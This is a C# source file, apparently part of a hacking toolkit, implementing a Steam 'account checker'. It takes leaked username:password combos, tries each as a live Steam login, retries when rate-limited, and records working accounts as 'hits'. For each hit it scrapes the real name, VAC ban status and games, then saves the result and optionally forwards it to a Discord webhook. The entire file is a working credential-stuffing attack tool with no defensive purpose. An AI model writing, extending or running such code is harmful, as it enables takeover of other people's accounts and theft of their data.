/*
------------------------------------------------------------
Made By notfishvr
github: https://github.com/official-notfishvr/Fish-Tools
------------------------------------------------------------
*/
using Fish_Tools.core.Utils;
using SteamKit2;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using Newtonsoft.Json;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
{
    internal class SteamAccountChecker : BaseAccountChecker
    {
        private bool EnableAccountInfo { get; set; } = true;
        private bool EnableVACInfo { get; set; } = true;
        private bool EnableGameInfo { get; set; } = false;

        public SteamAccountChecker() : base("Steam")
        {
            CooldownTime = 1000;
            MaxRetries = 2;
            EnableRetry = true;
        }

        protected override void GetAdditionalSettings(Logger logger)
        {
            base.GetAdditionalSettings(logger);
            logger.Info("Enable detailed account information? (y/n):");
            Console.Write("-> ");
            string accountInfo = Console.ReadLine()?.ToLower();
            EnableAccountInfo = accountInfo == "y" || accountInfo == "yes";

            logger.Info("Enable VAC ban information? (y/n):");
            Console.Write("-> ");
            string vacInfo = Console.ReadLine()?.ToLower();
            EnableVACInfo = vacInfo == "y" || vacInfo == "yes";

            logger.Info("Enable game count information? (y/n):");
            Console.Write("-> ");
            string gameInfo = Console.ReadLine()?.ToLower();
            EnableGameInfo = gameInfo == "y" || gameInfo == "yes";
        }

        protected override async Task ProcessCombo(string combo, Logger logger)
        {
            logger.Info($"Starting to process combo: {combo}");
            
            var comboParts = ParseCombo(combo);
            if (comboParts == null)
            {
                logger.Error($"Invalid combo format: {combo}");
                SaveError(combo, "Invalid format");
                return;
            }

            string username = comboParts[0];
            string password = comboParts[1];
            
            logger.Info($"Parsed combo - Username: {username}, Password: {password}");

            await RetryOperation(async () =>
            {
                await CheckLogin(username, password, logger);
            }, combo, logger);
        }

        private async Task CheckLogin(string username, string password, Logger logger)
        {
            try
            {
                logger.Info($"Attempting Steam login for: {username}");
                
                var steamClient = new SteamClient();
                var manager = new CallbackManager(steamClient);
                var steamUser = steamClient.GetHandler<SteamUser>();

                SteamLoginResult loginResult = null;
                bool isRunning = true;

                manager.Subscribe<SteamClient.ConnectedCallback>(callback =>
                {
                    logger.Info("Connected to Steam, attempting login...");
                    steamUser.LogOn(new SteamUser.LogOnDetails 
                    { 
                        Username = username, 
                        Password = password 
                    });
                });

                manager.Subscribe<SteamClient.DisconnectedCallback>(callback =>
                {
                    logger.Info("Disconnected from Steam");
                    isRunning = false;
                });

                manager.Subscribe<SteamUser.LoggedOnCallback>(callback =>
                {
                    if (callback.Result == EResult.OK)
                    {
                        logger.Info("Steam login successful!");
                        loginResult = new SteamLoginResult
                        {
                            Success = true,
                            SteamID = callback.ClientSteamID?.ToString() ?? "",
                            Result = callback.Result.ToString()
                        };
                    }
                    else if (callback.Result == EResult.AccountLogonDenied)
                    {
                        logger.Info("SteamGuard protected account");
                        loginResult = new SteamLoginResult
                        {
                            Success = false,
                            Result = "SteamGuard protected",
                            IsSteamGuardProtected = true
                        };
                    }
                    else
                    {
                        logger.Info($"Steam login failed: {callback.Result}");
                        string extendedResult = "";
                        if (callback.ExtendedResult != null)
                        {
                            extendedResult = callback.ExtendedResult.ToString();
                        }
                        
                        loginResult = new SteamLoginResult
                        {
                            Success = false,
                            Result = callback.Result.ToString(),
                            ExtendedResult = extendedResult
                        };
                    }
                    
                    steamUser.LogOff();
                    isRunning = false;
                });

                manager.Subscribe<SteamUser.LoggedOffCallback>(callback =>
                {
                    logger.Info($"Logged off: {callback.Result}");
                });

                steamClient.Connect();

                var timeout = DateTime.Now.AddSeconds(30);
                while (isRunning && DateTime.Now < timeout)
                {
                    manager.RunWaitCallbacks(TimeSpan.FromSeconds(1));
                    await Task.Delay(100);
                }

                if (loginResult == null)
                {
                    logger.Error("Login process timed out");
                    logger.Info("Waiting 30 seconds before retrying this account...");
                    await Task.Delay(30000);
                    throw new System.TimeoutException("Login process timed out");
                }

                if (loginResult.Success)
                {
                    string hitInfo = $"{username}:{password}";
                    string detailedInfo = hitInfo;

                    if (EnableAccountInfo && !string.IsNullOrEmpty(loginResult.SteamID))
                    {
                        try
                        {
                            detailedInfo += $" | SteamID: {loginResult.SteamID}";
                            
                            if (EnableVACInfo || EnableGameInfo)
                            {
                                using (var httpClient = new System.Net.Http.HttpClient())
                                {
                                    httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                                    httpClient.Timeout = TimeSpan.FromSeconds(10);

                                    if (EnableVACInfo)
                                    {
                                        try
                                        {
                                            var profileResponse = await httpClient.GetAsync($"https://steamcommunity.com/profiles/{loginResult.SteamID}/?xml=1");
                                            if (profileResponse.IsSuccessStatusCode)
                                            {
                                                var profileContent = await profileResponse.Content.ReadAsStringAsync();
                                                
                                                var displayNameMatch = Regex.Match(profileContent, @"<steamID><!\[CDATA\[([^\]]+)\]\]></steamID>");
                                                var realNameMatch = Regex.Match(profileContent, @"<realname><!\[CDATA\[([^\]]+)\]\]></realname>");
                                                var vacBannedMatch = Regex.Match(profileContent, @"<vacBanned>(\d+)</vacBanned>");
                                                
                                                if (displayNameMatch.Success)
                                                {
                                                    detailedInfo += $" | Display Name: {displayNameMatch.Groups[1].Value}";
                                                }
                                                
                                                if (realNameMatch.Success)
                                                {
                                                    detailedInfo += $" | Real Name: {realNameMatch.Groups[1].Value}";
                                                }
                                                
                                                if (vacBannedMatch.Success)
                                                {
                                                    bool isVACBanned = vacBannedMatch.Groups[1].Value == "1";
                                                    detailedInfo += $" | VAC Banned: {(isVACBanned ? "Yes" : "No")}";
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            logger.Warn($"Failed to get VAC info: {ex.Message}");
                                        }
                                    }

                                    if (EnableGameInfo)
                                    {
                                        try
                                        {
                                            var gamesResponse = await httpClient.GetAsync($"https://steamcommunity.com/profiles/{loginResult.SteamID}/games/?xml=1");
                                            if (gamesResponse.IsSuccessStatusCode)
                                            {
                                                var gamesContent = await gamesResponse.Content.ReadAsStringAsync();
                                                //logger.Info($"Raw games XML: {gamesContent}");
                                                var gameNameMatches = Regex.Matches(gamesContent, @"<name><!\[CDATA\[(.*?)\]\]></name>");
                                                if (gameNameMatches.Count > 0)
                                                {
                                                    var gameNames = gameNameMatches.Cast<Match>().Select(m => m.Groups[1].Value).ToList();
                                                    var displayedGames = gameNames.Take(10);
                                                    detailedInfo += $" | Games ({gameNames.Count}): {string.Join(", ", displayedGames)}";
                                                    if (gameNames.Count > 10)
                                                        detailedInfo += ", ...";
                                                }
                                                else
                                                {
                                                    var gameCountMatch = Regex.Match(gamesContent, @"<gameCount>(\\d+)</gameCount>");
                                                    if (gameCountMatch.Success)
                                                    {
                                                        string gameCount = gameCountMatch.Groups[1].Value;
                                                        detailedInfo += $" | Games: {gameCount}";
                                                    }
                                                    else
                                                    {
                                                        detailedInfo += " | Games: (private or none)";
                                                    }
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            logger.Warn($"Failed to get game info: {ex.Message}");
                                        }
                                    }
                                }
                            }
                            
                            logger.Info($"Account info retrieved: {detailedInfo}");
                        }
                        catch (Exception ex)
                        {
                            logger.Warn($"Failed to get account info: {ex.Message}");
                        }
                    }

                    if (UsingDiscord)
                    {
                        try
                        {
                            logger.Info("Sending Discord notification...");
                            await SendDiscordNotification(detailedInfo);
                            logger.Info("Discord notification sent successfully");
                        }
                        catch (Exception ex)
                        {
                            logger.Warn($"Failed to send Discord notification: {ex.Message}");
                        }
                    }

                    logger.Success($"[HIT] {detailedInfo}");
                    SaveHit(hitInfo, detailedInfo);
                }
                else if (loginResult.IsSteamGuardProtected)
                {
                    logger.Warn($"[STEAMGUARD] {username}:{password} | SteamGuard protected");
                    SaveBad($"{username}:{password}", "SteamGuard protected");
                }
                else
                {
                    string errorMessage = loginResult.Result;
                    if (!string.IsNullOrEmpty(loginResult.ExtendedResult))
                    {
                        errorMessage += $" ({loginResult.ExtendedResult})";
                    }
                    
                    logger.Error($"[BAD] {username}:{password} | {errorMessage}");
                    SaveBad($"{username}:{password}", errorMessage);
                }
            }
            catch (Exception ex)
            {
                string errorMessage = ex.Message;
                string errorType = ex.GetType().Name;
                
                if (errorMessage.Contains("TooManyRequests") || errorMessage.Contains("429"))
                {
                    logger.Warn($"[RATE_LIMITED] {username}:{password} | Rate limited");
                    SaveError($"{username}:{password}", "Rate limited");
                    throw;
                }
                else if (errorMessage.Contains("NetworkError") || errorMessage.Contains("Timeout"))
                {
                    logger.Error($"[ERROR] {username}:{password} | Network error: {errorMessage}");
                    SaveError($"{username}:{password}", errorMessage);
                    throw;
                }
                else
                {
                    logger.Error($"[ERROR] {username}:{password} | {errorMessage}");
                    logger.Error($"Exception type: {errorType}");
                    SaveError($"{username}:{password}", errorMessage);
                    throw;
                }
            }
        }

        private class SteamLoginResult
        {
            public bool Success { get; set; }
            public string SteamID { get; set; } = "";
            public string Result { get; set; } = "";
            public string ExtendedResult { get; set; } = "";
            public bool IsSteamGuardProtected { get; set; } = false;
        }

        protected override bool ShouldRetry(Exception ex)
        {
            return ex.Message.Contains("Rate limited") ||
                   ex.Message.Contains("TooManyRequests") ||
                   ex.Message.Contains("NetworkError") ||
                   ex.Message.Contains("Timeout") ||
                   ex.Message.Contains("ServiceUnavailable");
        }

        protected override void UpdateProgress(Logger logger)
        {
            if (ProcessedCombos % 5 == 0 || ProcessedCombos == TotalCombos)
            {
                var elapsed = DateTime.Now - StartTime;
                var rate = ProcessedCombos > 0 ? elapsed.TotalSeconds / ProcessedCombos : 0;
                var remaining = (TotalCombos - ProcessedCombos) * rate;
                var successRate = TotalCombos > 0 ? (double)Hits / TotalCombos * 100 : 0;
                
                Console.Title = $"Fish Tools | Steam | Progress: {ProcessedCombos}/{TotalCombos} | Hits: {Hits} | Success: {successRate:F1}% | ETA: {TimeSpan.FromSeconds(remaining):mm\\:ss}";
                
                logger.Info($"Steam Progress: {ProcessedCombos}/{TotalCombos} | Hits: {Hits} | Bads: {Bads} | Errors: {Errors} | Success: {successRate:F1}% | Rate: {rate:F2}s/combo");
            }
        }

        protected override void ShowFinalResults(Logger logger)
        {
            var elapsed = DateTime.Now - StartTime;
            
            Console.WriteLine();
            logger.Success("=== STEAM ACCOUNT CHECKING COMPLETED ===");
            logger.Info($"Total combos: {TotalCombos}");
            logger.Info($"Hits: {Hits}");
            logger.Info($"Bads: {Bads}");
            logger.Info($"Errors: {Errors}");
            logger.Info($"Success rate: {(double)Hits / TotalCombos * 100:F2}%");
            logger.Info($"Total time: {elapsed:hh\\:mm\\:ss}");
            logger.Info($"Average rate: {elapsed.TotalSeconds / TotalCombos:F2}s/combo");
            logger.Info($"Hits saved to: {HitsFile}");
            logger.Info($"Detailed hits saved to: {HitsFileDetailed}");
            
            if (UsingDiscord)
                logger.Info("Discord notifications were sent");
        }
    }
} 